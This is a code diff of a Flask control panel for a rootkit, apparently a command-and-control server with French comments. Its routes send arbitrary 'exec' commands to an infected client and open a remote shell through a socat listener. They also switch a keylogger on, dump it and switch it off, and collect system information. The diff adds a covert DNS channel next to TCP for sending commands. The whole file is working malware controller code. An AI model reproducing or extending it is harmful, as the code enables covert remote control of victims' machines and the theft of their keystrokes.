@@ -1,10 +1,38 @@
-from app import app
-import config as cfg
-from flask import jsonify, request
 from utils.socat import run_socat_shell
+from flask import jsonify, request
+import config as cfg
+from app import app
 import threading
 import time
 import re
+
+
+def handle_command(prefix, default_use_history, force_tcp=False):
+    data = {}
+    if request.is_json:
+        data = request.get_json(silent=True) or {}
+    else:
+        data = request.form.to_dict() or {}
+
+    cmd = data.get('command', '').strip() if isinstance(data, dict) else ''
+    use_history = data.get('use_history', default_use_history)
+    full_cmd = f"{prefix} {cmd}".strip()
+
+    # Check wheter the channel is TCP or DNS
+    channel = data.get('channel', 'tcp')
+    cfg.last_channel = channel
+
+    try:
+        if force_tcp or channel == 'tcp':
+            if use_history: result = cfg.rootkit_connexion.send(full_cmd, True, 'tcp')
+            else: result = cfg.rootkit_connexion.send(full_cmd, False, 'tcp')
+        else:
+            result = cfg.rootkit_connexion.send(full_cmd, True, 'dns')
+    except Exception as e:
+        result = f"[ERROR] : {e}"
+
+    return jsonify(result), 200
+
 
 def getClientInfos():
     if not cfg.rootkit_connexion:
@@ -14,8 +42,8 @@ def getClientInfos():
             "last_command": None,
         }
 
-    ip = cfg.rootkit_connexion.get_client_ip()
-    port = cfg.rootkit_connexion.get_listening_port()
+    ip = cfg.rootkit_connexion.get_tcp_object().get_client_ip()
+    port = cfg.rootkit_connexion.get_tcp_object().get_listening_port()
     history = cfg.rootkit_connexion.get_command_history()
     last_command = history[-1]['command'] if history else None
 
@@ -25,10 +53,12 @@ def getClientInfos():
         "last_command": last_command,
     }
 
+
 @app.route('/client-info', methods=['GET'])
 def clientInfo():
     info = getClientInfos()
     return jsonify(info), 200
+
 
 @app.route('/get-history', methods=['GET'])
 def get_history():
@@ -41,38 +71,16 @@ def get_history():
 
     return jsonify(history), 200
 
-##### ROOTKIT COMMANDS HANDLER #####
-
-def handle_command(prefix, default_use_history):
-    data = {}
-    if request.is_json:
-        data = request.get_json(silent=True) or {}
-    else:
-        data = request.form.to_dict() or {}
-
-    cmd = data.get('command', '').strip() if isinstance(data, dict) else ''
-    use_history = data.get('use_history', default_use_history)
-
-    full_cmd = f"{prefix} {cmd}".strip()
-
-    try:
-        if use_history:
-            result = cfg.rootkit_connexion.send_to_client_with_history(full_cmd)
-        else:
-            result = cfg.rootkit_connexion.send_to_client(full_cmd)
-    except Exception as e:
-        result = f"💥 Erreur : {e}"
-
-    return jsonify(result), 200
-
 
 @app.route('/send', methods=['POST'])
 def send():
     return handle_command("", False)
 
+
 @app.route('/exec', methods=['POST'])
 def exec_command():
     return handle_command("exec", True)
+
 
 @app.route('/connect', methods=['POST'])
 def connect_command():
@@ -81,6 +89,7 @@ def connect_command():
         return response, 200
     else:
         return response, 403
+
 
 @app.route('/getshell', methods=['POST'])
 def getshell():
@@ -96,7 +105,7 @@ def getshell():
             threading.Thread(target=run_socat_shell, args=(port,), daemon=True).start()
             time.sleep(1)
 
-            cfg.rootkit_connexion.send_to_client(f"getshell {port}")
+            cfg.rootkit_connexion.send(f"getshell {port}", False, 'tcp')
             response["status"] = "success"
             response["message"] = f"🚀 Shell distant lancé sur le port {port}."
 
@@ -106,44 +115,52 @@ def getshell():
 
     return response, 200
 
+
 @app.route('/killcom', methods=['POST'])
 def killcom_command():
     return handle_command("killcom", False)
 
+
 @app.route('/disconnect', methods=['POST'])
 def disconnect_command():
-    response, status_code = handle_command("disconnect", False)
+    response, _ = handle_command("disconnect", False)
     if not cfg.rootkit_connexion.is_authenticated():
         return response, 200
     else:
         return response, 403
 
+
 @app.route('/klgon', methods=['POST'])
 def klgon_command():
     return handle_command("klgon", False)
+
 
 @app.route('/klg', methods=['GET'])
 def klg_command():
     return handle_command("klg", False)
 
+
 @app.route('/klgoff', methods=['POST'])
 def klgoff_command():
     return handle_command("klgoff", False)
 
+
 @app.route('/sysinfo', methods=['GET'])
 def sysinfo_command():
-    result = cfg.rootkit_connexion.get_client_sysinfo()
+    result = cfg.rootkit_connexion.get_tcp_object().get_client_sysinfo()
     if result is None:
         return jsonify({'error': 'No client sysinfo available.'}), 404
     return jsonify(result), 200
 
+
 @app.route('/diskusage', methods=['GET'])
 def diskusage_command():
-    return handle_command("exec df -h", False)
+    return handle_command("exec df -h", False, force_tcp=True)
+
 
 @app.route('/cpu-ram', methods=['GET'])
 def cpu_ram_command():
-    response, status_code = handle_command('exec grep "^cpu " /proc/stat', False)
+    response, _ = handle_command('exec grep "^cpu " /proc/stat', False, force_tcp=True)
     cpu_response_data = response.get_data(as_text=True).split("stdout:\\n")[-1].split("stderr:")[0].strip().replace('\\n', '\n')
 
     response, status_code = handle_command('exec free -m', False)
